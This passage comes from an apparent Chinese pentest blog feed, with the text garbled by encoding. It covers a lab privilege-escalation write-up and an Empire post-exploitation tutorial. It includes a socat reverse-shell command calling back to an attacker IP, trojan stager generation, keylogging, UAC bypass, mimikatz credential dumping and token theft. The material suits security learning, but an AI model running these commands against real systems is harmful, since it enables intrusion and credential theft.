ç„¶ååˆ‡ä¸€ä¸ªç®€æ˜“ç»ˆç«¯,è¿™ä¸ªè¯¦ç»†å¯ä»¥çœ‹<a href="http://www.freebuf.com/news/142195.html" title="http://www.freebuf.com/news/142195.html">http://www.freebuf.com/news/142195.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Listener:</span></span><br><span class="line">socat file:`tty`,raw,echo=0 tcp-listen:4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Victim:</span></span><br><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 </span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-13-01-06-46å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="etcpasswd">/etc/passwd</h3><p>è¿™æ¬¡çš„/etc/passwdå¯å†™,è€Œä¸”å¯ä»¥æ”¹å¯†ç çš„hash,é‚£å°±ç®€å•äº†,æˆ‘ä»¬è¦†ç›–å¯†ç ,ç„¶åæƒé™ç»™<code>0:0</code> <img src="/images/2018/09/2018-09-13-01-14-20å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå°±rootäº† <img src="/images/2018/09/2018-09-13-01-16-38å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="opts">/opt/s</h3><p>é¦–å…ˆ/opté‡Œé¢æœ‰s stringsä¸€ä¸‹ <img src="/images/2018/09/2018-09-13-01-18-56å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°æœ‰scpå‘½ä»¤è€Œä¸”æ˜¯root,é‚£ä¹ˆæˆ‘ä»¬å†™ä¸€ä¸ªæ¶æ„çš„scpç„¶åå»è¦†ç›–æ‰§è¡Œå°±å¯ä»¥äº† <img src="/images/2018/09/2018-09-13-01-25-25å±å¹•æˆªå›¾.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>empireå­¦ä¹ </title>
      <link href="/2018/09/11/empire%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/11/empire%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Empireæ˜¯ä¸€ä¸ªé’ˆå¯¹windowså¹³å°çš„ä½¿ç”¨PowerShellè„šæœ¬ä½œä¸ºæ”»å‡»è½½è·çš„æ¸—é€æ”»å‡»æ¡†æ¶,åœ¨åŸŸæ¸—é€ä¸­æœ‰å¾ˆå¤§ä½œç”¨,è¿™é‡Œä¸»è¦æ˜¯é€šè¿‡å®‰å…¨å®¢ä¸Šçš„æ–‡ç« è¿›è¡Œç®€å•çš„å­¦ä¹ å§ æ–‡ç« é“¾æ¥: <a href="https://www.anquanke.com/post/id/87328" title="https://www.anquanke.com/post/id/87328">https://www.anquanke.com/post/id/87328</a> <a href="https://www.anquanke.com/post/id/87333" title="https://www.anquanke.com/post/id/87333">https://www.anquanke.com/post/id/87333</a></p><h2 id="å®‰è£…">å®‰è£…</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line">cd Empire</span><br><span class="line">cd setup</span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨çš„æ—¶å€™æŠ¥ç¼ºå°‘module,å°±ç”¨pipè£…ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirments.txt</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œäº†ç›´æ¥<code>./empire</code>å°±å¯ä»¥äº† <img src="/images/2018/09/2018-09-08-14-27-11å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="è®¾ç½®ç›‘å¬">è®¾ç½®ç›‘å¬</h2><p>è¿›å…¥empireä¹‹åå¯ä»¥helpæŸ¥çœ‹å¸®åŠ© <img src="/images/2018/09/2018-09-08-14-28-45å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä¸€èˆ¬æ¥è¯´ä½¿ç”¨æ­¥éª¤å°±æ˜¯å…ˆè®¾ç½®ä¸€ä¸ªç›‘å¬,ç„¶åå»ç”Ÿæˆä¸€ä¸ªæœ¨é©¬,åœ¨ç›®æ ‡ä¸»æœºä¸Šé¢è¿è¡Œè¿™ä¸ªæœ¨é©¬,æˆ‘ä»¬è¿™è¾¹å°±å¯ä»¥å¾—åˆ°åå¼¹çš„shelläº† é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¿›å…¥ç›‘å¬çº¿ç¨‹é¡µé¢ <img src="/images/2018/09/2018-09-08-14-34-48å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå¯ä»¥uselistener,è¿™é‡Œæˆ‘ä»¬é€‰æ‹©http <img src="/images/2018/09/2018-09-08-14-36-10å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¯ä»¥è¾“å…¥infoæŸ¥çœ‹é…ç½®,ç”¨setå¯ä»¥è¿›è¡Œè®¾ç½® ç„¶åæˆ‘ä»¬å¯ä»¥setä¸€ä¸‹åå­—,ä¸ºäº†æ–¹ä¾¿æˆ‘å°±ç”¨ä»–çš„åå­—äº† ç„¶åipè¿™é‡Œæ˜¯æˆ‘ä»¬çš„æœ¬æœºip,æ‰€ä»¥å¹¶ä¸éœ€è¦é…ç½® <img src="/images/2018/09/2018-09-08-14-40-37å±å¹•æˆªå›¾.png" alt="blacsheep" /> å®Œæˆäº†ä¹‹åå¯ä»¥å¼€å§‹ç›‘å¬äº†,æ³¨æ„,è¦æ˜¯ä¹‹å‰å¼€äº†80ç«¯å£çš„è¯å…ˆå…³æ‰ <img src="/images/2018/09/2018-09-08-14-43-09å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬backå›å»listå¯ä»¥æŸ¥çœ‹ç›‘å¬ <img src="/images/2018/09/2018-09-08-14-44-38å±å¹•æˆªå›¾.png" alt="blacsheep" /> æƒ³è¦åˆ é™¤å¯ä»¥ç›´æ¥ç”¨kill <img src="/images/2018/09/2018-09-08-14-45-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿™é‡Œæ³¨æ„,å¦‚æœè¦å¼€å¤šä¸ªç›‘å¬çš„è¯å¿…é¡»ä½¿ç”¨ä¸åŒçš„åå­—å’Œç«¯å£.</p><h2 id="ç”Ÿæˆæœ¨é©¬">ç”Ÿæˆæœ¨é©¬</h2><p>ç›‘å¬è®¾ç½®å¥½äº†,å°±å»ç”Ÿæˆæœ¨é©¬å»ç›®æ ‡æœºå™¨ä¸Šé¢è¿è¡Œå°±å¥½äº† æˆ‘ä»¬ç”¨usestaggeræ¥æŸ¥çœ‹æ¨¡å— <img src="/images/2018/09/2018-09-08-14-49-48å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿™é‡Œmultiæ˜¯é€šç”¨,osxæ˜¯macç³»ç»Ÿçš„,windowså°±æ˜¯windowsçš„,ä¸‹é¢å¯¹å‡ ç§ç±»å‹çš„æœ¨é©¬è®²è§£ä¸€ä¸‹</p><h3 id="dll">dll</h3><p>ç›´æ¥useä¸€ä¸‹,ç„¶åinfoçœ‹ä¸‹é…ç½® <img src="/images/2018/09/2018-09-08-14-53-32å±å¹•æˆªå›¾.png" alt="blacsheep" /> è®¾ç½®ä¸€ä¸‹listener,ç„¶åç”Ÿæˆæ–‡ä»¶ <img src="/images/2018/09/2018-09-08-15-19-07å±å¹•æˆªå›¾.png" alt="blacsheep" /> å³å¯ç”Ÿæˆè€Œæ¶æ„dll,ä¸è¿‡æˆ‘å®éªŒä¹‹åå¹¶æ²¡æœ‰è¿”å›agent,ä¹‹åå†çœ‹å§</p><h3 id="launcher">launcher</h3><p>å½“ä»…ä»…åªæ˜¯éœ€è¦ä¸€æ®µç®€å•çš„ä»£ç çš„æ—¶å€™,å¯ä»¥ç›´æ¥åœ¨listenç•Œé¢ä½¿ç”¨launcher æ¯”å¦‚ <img src="/images/2018/09/2018-09-08-16-49-50å±å¹•æˆªå›¾.png" alt="blacsheep" /> åˆ°ç›®æ ‡æœºå™¨ä¸Šé¢å»è¿è¡Œ,ç„¶åå°±æœ‰ä¸€æ®µè¿æ¥ä¿¡æ¯ <img src="/images/2018/09/2018-09-08-16-51-03å±å¹•æˆªå›¾.png" alt="blacsheep" /> åˆ‡æ¢åˆ°agents,ç„¶åå°±å¯ä»¥interactè¿ä¸Šå» <img src="/images/2018/09/2018-09-08-16-53-17å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="launcher_vbs">launcher_vbs</h3><p>ä¸€æ ·çš„,é€‰æ‹©staggerçš„æ—¶å€™ç”¨vbs,ç„¶åsetå¥½å‚æ•°,executeç”Ÿæˆæ–‡ä»¶,ç„¶åç›®æ ‡ä¸»æœºå»è¿è¡Œ <img src="/images/2018/09/2018-09-08-17-00-23å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="å…¶ä»–">å…¶ä»–</h3><p>åé¢è¿˜æœ‰bat,macroå’Œducky batå’Œmacroéƒ½å¯ä»¥æ’å…¥åˆ°wordé‡Œé¢,ä¸è¿‡ä¼šæŠ¥å®ç—…æ¯’... å¯ä»¥è‡ªå·±å»å°è¯•</p><h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2><p>empireä¸»è¦ç”¨äºåæ¸—é€,é‚£ä¹ˆä¿¡æ¯æ”¶é›†å°±æ˜¯å¾ˆé‡è¦çš„æ¨¡å—äº†,æˆ‘ä»¬å¯ä»¥searchmoduleå‘½ä»¤æ¥æœç´¢ç›¸åº”çš„æ¨¡å—(å°±åƒmsfçš„search) åŒæ ·æˆ‘ä»¬å¯ä»¥usemodule ç„¶åtabæ¥æŸ¥çœ‹ä¸€äº›module,æˆ‘ä»¬searchmodule collection,å¾—åˆ°è¿”å› <img src="/images/2018/09/2018-09-08-17-49-45å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="æˆªå›¾">æˆªå›¾</h3><p>æˆ‘ä»¬ä½¿ç”¨screenshot,infoæŸ¥çœ‹ä¿¡æ¯ <img src="/images/2018/09/2018-09-08-17-51-16å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åè®¾ç½®å¥½agentä¹‹åexecuteå°±å¯ä»¥äº† <img src="/images/2018/09/2018-09-08-17-53-59å±å¹•æˆªå›¾.png" alt="blacsheep" /> å›¾ç‰‡å­˜åœ¨äº†<code>/Empire/downloads/BA3HM8WF/screenshot</code> <img src="/images/2018/09/2018-09-08-17-58-00å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="é”®ç›˜è®°å½•">é”®ç›˜è®°å½•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/collection/keylogger</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç›´æ¥executeå°±å¥½,ç„¶ååœ¨interactä¹‹åå¯ä»¥ç”¨<code>jobs</code>å‘½ä»¤çœ‹è§æˆ‘ä»¬æŒ‚åœ¨åå°çš„æ“ä½œ,è€Œä¸”å¯ä»¥<code>jobs kill JOBS_ID</code>æ¥æ€æ‰è¿›ç¨‹ <img src="/images/2018/09/2018-09-08-18-06-13å±å¹•æˆªå›¾.png" alt="blacsheep" /> åœ¨keystrokes.txtä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„é”®ç›˜è®°å½• <img src="/images/2018/09/2018-09-08-18-11-05å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="å‰ªåˆ‡æ¿è®°å½•">å‰ªåˆ‡æ¿è®°å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule collection/clipboard_monitor</span><br></pre></td></tr></table></figure><p>ç„¶åinfoæŸ¥çœ‹ä¸€ä¸‹,ç›´æ¥execute <img src="/images/2018/09/2018-09-10-10-34-14å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="æŸ¥çœ‹åŸŸå…±äº«">æŸ¥çœ‹åŸŸå…±äº«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/powerview/share_finder</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰ä¸€äº›é…ç½®,éœ€è¦çš„è¯å¯ä»¥è‡ªå·±é…ç½®ä¸€ä¸‹,æˆ‘è¿™é‡Œç›´æ¥executeäº†,ä¸è¿‡ç”±äºæ²¡æœ‰æ­å»ºåŸŸç¯å¢ƒ,æ‰€ä»¥æ²¡æœ‰ä¸œè¥¿ <img src="/images/2018/09/2018-09-10-10-43-46å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="ä¸»æœºç›¸å…³ä¿¡æ¯">ä¸»æœºç›¸å…³ä¿¡æ¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹æœ¬æœºç”¨æˆ·,åŸŸç»„æˆå‘˜,æœ€åå¯†ç è®¾ç½®æ—¶é—´,å‰ªè´´æ¿å†…å®¹,ç³»ç»ŸåŸºæœ¬ç³»ç»Ÿä¿¡æ¯,ç½‘ç»œé€‚é…å™¨ä¿¡æ¯,å…±äº«ä¿¡æ¯ç­‰ç­‰ <img src="/images/2018/09/2018-09-10-10-53-13å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="arpæ‰«æ">arpæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/arpscan</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œéœ€è¦è®¾ç½®Rangeå‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: powershell/situational_awareness/network/arpscan) &gt; set Range 10.0.2.0-10.0.2.254</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-11-01-38å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="dnsä¿¡æ¯è·å–">dnsä¿¡æ¯è·å–</h3><h4 id="å†…ç½‘dnsåæŸ¥">å†…ç½‘dnsåæŸ¥</h4><p>åœ¨å†…ç½‘ä¸­,çŸ¥é“æ‰€æœ‰æœºå™¨çš„HostNameå’Œå¯¹åº”çš„IPåœ°å€å¯¹åˆ†æå†…ç½‘ç»“æ„è‡³å…³é‡è¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/reverse_dns</span><br></pre></td></tr></table></figure><p>åŒæ ·,æ³¨æ„è®¾ç½®ä¸€ä¸‹Range <img src="/images/2018/09/2018-09-10-11-10-01å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h4 id="æŸ¥è¯¢dnsæœåŠ¡å™¨">æŸ¥è¯¢dnsæœåŠ¡å™¨</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/host/dnsserver</span><br></pre></td></tr></table></figure><p>ä¸éœ€è¦å‚æ•°,ç›´æ¥æŸ¥è¯¢å³å¯ <img src="/images/2018/09/2018-09-10-11-13-39å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="æŸ¥æ‰¾åŸŸç®¡ç™»å½•æœåŠ¡å™¨ip">æŸ¥æ‰¾åŸŸç®¡ç™»å½•æœåŠ¡å™¨ip</h3><p>å†…ç½‘æ¸—é€ä¸­,æ‹¿åˆ°ä¸€å°å†…ç½‘æœºæƒ³è¦è·å¾—åŸŸç®¡æƒé™æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ¨ªå‘æ¸—é€,æ‹¿ä¸‹åŸŸç®¡ç™»å½•çš„æœºå­ç„¶åæ¨ªå‘æ¸—é€è¿›å»,çªƒå–åŸŸç®¡çš„æƒé™ä»è€Œæ‹¿ä¸‹æ•´ä¸ªåŸŸ. è¿™ä¸ªæ¨¡å—å°±æ˜¯ç”¨æ¥æŸ¥æ‰¾åŸŸç®¡ç™»å½•è¿‡çš„æœåŠ¡å™¨çš„ipçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: HR6YCPW3) &gt; usemodule situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><p>ç„¶åexecuteå³å¯,æˆ‘æœ¬åœ°æ²¡æœ‰æ­å»ºç¯å¢ƒ,æ²¡æœ‰ç›¸å…³ä¿¡æ¯</p><h3 id="æœ¬åœ°ç®¡ç†ç»„è®¿é—®">æœ¬åœ°ç®¡ç†ç»„è®¿é—®</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule situational_awareness/network/powerview/find_localadmin_access</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-13-40-09å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h3 id="è·å–åŸŸæ§åˆ¶å™¨">è·å–åŸŸæ§åˆ¶å™¨</h3><p>å‡å¦‚æˆ‘ä»¬æˆåŠŸåœ°æ‹¿åˆ°äº†åŸŸç”¨æˆ·æƒé™,é‚£ä¹ˆå¯ä»¥æ¥æ‰¾åŸŸæ§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule situational_awareness/network/powerview/get_domain_controller</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-13-46-33å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="ææƒ">ææƒ</h2><p>Windowsåœ¨Vistaç³»ç»Ÿå¼€å§‹å¼•å…¥UACè´¦æˆ·æ§åˆ¶ä½“ç³»</p><blockquote><p>é«˜:å®Œæ•´çš„ç®¡ç†å‘˜æƒé™ ä¸­:æ ‡å‡†ç”¨æˆ·æƒé™ ä½:å¾ˆä½çš„æƒé™</p></blockquote><p>å³ä½¿å½“å‰ç”¨æˆ·æ˜¯æœ¬åœ°ç®¡ç†å‘˜,åŒå‡»è¿è¡Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åºæ—¶ä¹Ÿæ˜¯ä»¥æ ‡å‡†ç”¨æˆ·æƒé™è¿è¡Œçš„(é™¤éå³å‡»-é€‰æ‹©ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ)ã€‚æ‰€ä»¥å³ä½¿æˆ‘ä»¬è·å¾—çš„æƒé™æ˜¯æœ¬åœ°ç®¡ç†å‘˜æƒé™,ä¹Ÿæ²¡æœ‰åŠæ³•æ‰§è¡Œä¸€äº›å‘½ä»¤(ç‰¹æ®Šæ³¨å†Œè¡¨å†™å…¥ã€LSASSè¯»å–/å†™å…¥ç­‰ç­‰),æ‰€ä»¥æ¸—é€çš„ç¬¬ä¸€æ­¥ä¾¿æ˜¯ææƒ,ææƒçš„å‰æä¾¿æ˜¯çŸ¥é“è‡ªå·±æ‹¥æœ‰ä»€ä¹ˆæƒé™,å¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºçš„å¦‚æœæ˜¯High Mandatory Levelè¡¨ç¤ºæ˜¯ç®¡ç†å‘˜æƒé™,Medium Mandatory Levelåˆ™æ˜¯æ™®é€šç”¨æˆ·æƒé™ æˆ‘è¿™é‡Œæ˜¯æ™®é€šç”¨æˆ· <img src="/images/2018/09/2018-09-10-13-56-05å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="bypassuac">bypassuac</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: F8AT9WYP) &gt; usemodule privesc/bypassuac</span><br></pre></td></tr></table></figure><p>infoä¹‹åè®°å¾—è®¾ç½®listener,å› ä¸ºè¿™é‡Œä¼šä¸Šçº¿ä¸€ä¸ªæ–°çš„åå¼¹ <img src="/images/2018/09/2018-09-10-13-58-36å±å¹•æˆªå›¾.png" alt="blacsheep" /> å›åˆ°agentsæŸ¥çœ‹ å¸¦äº†*å·çš„æ˜¯ææƒæˆåŠŸçš„ <img src="/images/2018/09/2018-09-10-14-01-48å±å¹•æˆªå›¾.png" alt="blacsheep" /> æˆ‘ä»¬interactä¸Šå» <img src="/images/2018/09/2018-09-10-14-03-42å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°æƒé™å·²ç»æ˜¯highäº†</p><h3 id="bypassuac_wscript">bypassuac_wscript</h3><p>è¿™ä¸ªæ¨¡å—å¤§æ¦‚åŸç†æ˜¯ä½¿ç”¨c:Windowswscript.exeæ‰§è¡Œpayload,å®ç°ç®¡ç†å‘˜æƒé™æ‰§è¡Œpayload,ç»•è¿‡UACã€‚åªé€‚ç”¨äºç³»ç»Ÿä¸ºWindows 7,ç›®å‰å°šæ²¡æœ‰å¯¹åº”è¡¥ä¸(17å¹´11æœˆ),éƒ¨åˆ†æ€æ¯’è½¯ä»¶ä¼šæœ‰æç¤ºã€‚ <img src="/images/2018/09/2018-09-10-14-08-09å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¦‚ä¸‹å›¾æ‰€ç¤º,å¸¦å‹å·çš„å³ä¸ºææƒæˆåŠŸçš„ã€‚ <img src="/images/2018/09/2018-09-10-14-11-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> interactç„¶åæŸ¥çœ‹ä¸€ä¸‹ <img src="/images/2018/09/2018-09-10-14-11-06å±å¹•æˆªå›¾.png" alt="blacsheep" /> ææƒæˆåŠŸ</p><h3 id="ms16-032">ms16-032</h3><p>empireè‡ªå¸¦äº†ms16-032æ¨¡å—,useä¸€ä¸‹è®¾ç½®ä¸€ä¸‹listener,executeå³å¯ææƒ,ä¸è¿‡æˆ‘è¿™é‡Œæ˜¯è™šæ‹Ÿæœº,æç¤ºè¦æ±‚ä¸¤æ ¸ä»¥ä¸Šçš„CPUæ‰èƒ½ææƒ <img src="/images/2018/09/2018-09-10-14-17-40å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="ms16-135">ms16-135</h3><p>åŒç†ä½¿ç”¨,ä¸è¿‡æé†’ä¸€ä¸‹,è¿è¡Œçš„æ—¶å€™å—å®³è€…æ¡Œé¢ä¼šé—ªå±,è€Œä¸”æœ‰è“å±çš„å¯èƒ½,æˆ‘æµ‹è¯•çš„æ—¶å€™ç¬¬ä¸€æ¬¡æ˜¯è“å±,ä¸è¿‡ç¬¬äºŒæ¬¡æˆåŠŸäº† <img src="/images/2018/09/2018-09-10-14-30-01å±å¹•æˆªå›¾.png" alt="blacsheep" /> æˆåŠŸä¹‹å,æ˜¾ç¤ºçš„æ˜¯systemæƒé™ <img src="/images/2018/09/2018-09-10-14-31-55å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="powerup">powerup</h3><p>Empireå†…ç½®äº†PowerUpéƒ¨åˆ†å·¥å…·,ç”¨äºç³»ç»Ÿææƒ,ä¸»è¦ä¸ºWindowsé”™è¯¯ç³»ç»Ÿé…ç½®æ¼æ´,Windows Servicesæ¼æ´,AlwaysInstallElevatedæ¼æ´ç­‰8ç§ææƒæ–¹å¼,è¾“å…¥â€œusemodule privesc/powerupâ€ç„¶åæŒ‰Tabé”®æ¥æŸ¥çœ‹å®Œæ•´åˆ—è¡¨,å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ <img src="/images/2018/09/2018-09-10-14-39-16å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="allchecks">allchecks</h3><p>å¦‚ä½•æŸ¥æ‰¾ä¸Šè¿°çš„æ¼æ´,æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨allchecks</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: 96XZYBKD) &gt; usemodule privesc/powerup/allchecks</span><br></pre></td></tr></table></figure><p>ç›´æ¥executeå³å¯ <img src="/images/2018/09/2018-09-10-14-58-45å±å¹•æˆªå›¾.png" alt="blacsheep" /> æµ‹è¯•ä¸€ä¸‹bypassuac,æˆåŠŸè¿”å›é«˜æƒé™</p><h4 id="æ–‡æ¡£">æ–‡æ¡£</h4><p>å®˜æ–¹è¯´æ˜å¦‚ä¸‹ï¼š l å¯¹äºä»»ä½•æ²¡æœ‰å¼•å·çš„æœåŠ¡è·¯å¾„é—®é¢˜ l å¯¹äºACLé…ç½®é”™è¯¯çš„ä»»ä½•æœåŠ¡ï¼ˆå¯é€šè¿‡service_ *åˆ©ç”¨ ï¼‰ l æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä¸Šçš„ä»»ä½•ä¸å½“æƒé™ï¼ˆå¯é€šè¿‡service_exe_ *è¿›è¡Œåˆ©ç”¨ï¼‰ l å¯¹äºä»»ä½•å‰©ä½™çš„unattend.xmlæ–‡ä»¶ l å¦‚æœAlwaysInstallElevatedæ³¨å†Œè¡¨é¡¹è®¾ç½® l å¦‚æœæœ‰ä»»ä½•Autologonå‡­è¯ç•™åœ¨æ³¨å†Œè¡¨ä¸­ l ç”¨äºä»»ä½•åŠ å¯†çš„web.configå­—ç¬¦ä¸²å’Œåº”ç”¨ç¨‹åºæ± å¯†ç  l å¯¹äºä»»ä½•ï¼…PATHï¼….DLLåŠ«æŒæœºä¼šï¼ˆå¯é€šè¿‡write_dllhijackeråˆ©ç”¨ï¼‰</p><h3 id="gpp">gpp</h3><p>åœ¨åŸŸé‡Œé¢å¾ˆå¤šéƒ½ä¼šå¯ç”¨ç»„ç­–ç•¥é¦–é€‰é¡¹æ¥æ‰§è¡Œæœ¬åœ°å¯†ç æ›´æ”¹,ä»¥ä¾¿äºç®¡ç†å’Œæ˜ åƒéƒ¨ç½²ã€‚ç¼ºç‚¹æ˜¯ä»»ä½•æ™®é€šåŸŸç”¨æˆ·éƒ½å¯ä»¥ä»ç›¸å…³åŸŸæ§åˆ¶å™¨çš„SYSVOLä¸­è¯»å–åˆ°éƒ¨ç½²ä¿¡æ¯ã€‚è™½ç„¶ä»–æ˜¯é‡‡ç”¨AES 256åŠ å¯†çš„,ä½¿ç”¨usemodule privesc/gpp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Empire: 96XZYBKD) &gt; usemodule privesc/gpp</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-10-15-11-06å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="æ¨ªå‘æ¸—é€">æ¨ªå‘æ¸—é€</h2><h3 id="ä»¤ç‰Œçªƒå–">ä»¤ç‰Œçªƒå–</h3><h4 id="mimikatz">mimikatz</h4><p>è·å–åˆ°äº†æœåŠ¡å™¨çš„æƒé™ä¹‹å,æˆ‘ä»¬å¯ä»¥ä½¿ç”¨mimikatzè·å–ç³»ç»Ÿå¯†ç  <img src="/images/2018/09/2018-09-10-15-24-14å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åcredså°±å¯ä»¥è·å–åˆ°hashå¯†ç ç”šè‡³æ˜æ–‡å¯†ç äº† <img src="/images/2018/09/2018-09-10-15-26-03å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h4 id="steal_token">steal_token</h4><p>å‡å¦‚åŸŸç”¨æˆ·åœ¨è¿™ä¸ªæœåŠ¡å™¨ä¸Šé¢ç™»å½•è¿‡,é‚£æˆ‘ä»¬å°±å¯ä»¥å»çªƒå–åŸŸç”¨æˆ·çš„èº«ä»½ä»¤ç‰Œ,æ¯”å¦‚æˆ‘ä»¬è¿™é‡Œæ‰§è¡Œ<code>pth &lt;ID&gt;</code>,è¿™é‡Œçš„IDæ˜¯credså‰é¢çš„id <img src="/images/2018/09/2018-09-10-15-41-54å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå¯ä»¥çœ‹åˆ°pid,æˆ‘ä»¬ç›´æ¥<code>steal_token pid</code> <img src="/images/2018/09/2018-09-10-15-45-20å±å¹•æˆªå›¾.png" alt="blacsheep" /> åŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥psè·å–è¿›ç¨‹ <img 